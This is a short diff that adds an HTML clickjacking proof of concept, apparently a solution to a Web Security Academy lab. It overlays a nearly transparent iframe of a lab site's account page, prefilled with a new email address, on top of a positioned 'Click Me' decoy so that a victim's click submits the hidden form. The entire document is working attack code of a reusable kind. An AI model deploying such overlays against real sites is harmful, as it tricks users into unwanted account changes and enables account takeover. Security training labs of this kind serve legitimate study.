@@ -1,0 +1,20 @@
+	<style>
+		#target_website {
+			position: relative;
+			width: 600px;
+			height: 600px;
+			opacity: 0.1;
+			z-index: 2;
+			}
+		#decoy_website {
+			position: absolute;
+			z-index: 1;
+			top: 448px;
+			left: 73px;
+			}
+	</style>
+	<div id="decoy_website">
+	Click Me
+	</div>
+	<iframe scrolling="no" id="target_website" src="https://0a34008903c6b0538075bc0300c90053.web-security-academy.net/my-account?email=carlos@gmail.com" sandbox="allow-forms" >
+	</iframe>
